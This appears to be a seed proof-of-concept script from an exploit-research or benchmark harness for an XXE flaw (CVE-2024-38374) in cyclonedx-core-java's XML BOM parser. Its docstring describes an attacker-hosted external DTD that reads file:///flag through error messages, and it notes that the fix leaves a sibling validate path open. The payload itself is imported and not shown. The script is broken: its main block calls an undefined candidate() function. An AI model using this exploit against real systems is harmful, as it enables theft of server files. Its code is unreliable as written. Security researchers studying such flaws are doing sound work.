#!/usr/bin/env python3
"""[GIVEN] CVE-2024-38374 seed -- XXE in the cyclonedx-core-java XML BOM PARSER.

Vector: an XML SBOM whose DOCTYPE pulls an attacker-hosted external parameter-entity DTD that performs an
error-based read of file:///flag. It is handed to the REAL org.cyclonedx.parsers.XmlParser.parse(byte[])
via POST /parse.

On V0 (8.0.0) parse() calls extractAllNamespaceDeclarations, which evaluates an XPath over the document
using a DEFAULT (insecure) DocumentBuilder -> the external DTD/entities resolve -> the flag content lands
in the library's own error text -> flag surfaces in the response.

On V1 (9.0.4, the CVE-2024-38374 fix = TARGET) parse() uses createSecureDocument, which sets
ACCESS_EXTERNAL_DTD="" / ACCESS_EXTERNAL_SCHEMA="" on the DocumentBuilderFactory -> the external DTD is
refused -> no file read -> BLOCKED (no flag). That is the guard CVE-2025-64518 shows is incomplete,
because the sibling VALIDATE path stayed open on V1.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import post, XXE_SBOM  # noqa: E402

ORIGINAL_PAYLOAD = XXE_SBOM


def original_poc(*, version="v1"):
    """Run the CVE-2024-38374 XXE seed through the PARSE path on `version`; return the response text."""
    return post(ORIGINAL_PAYLOAD, version, "/parse")


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
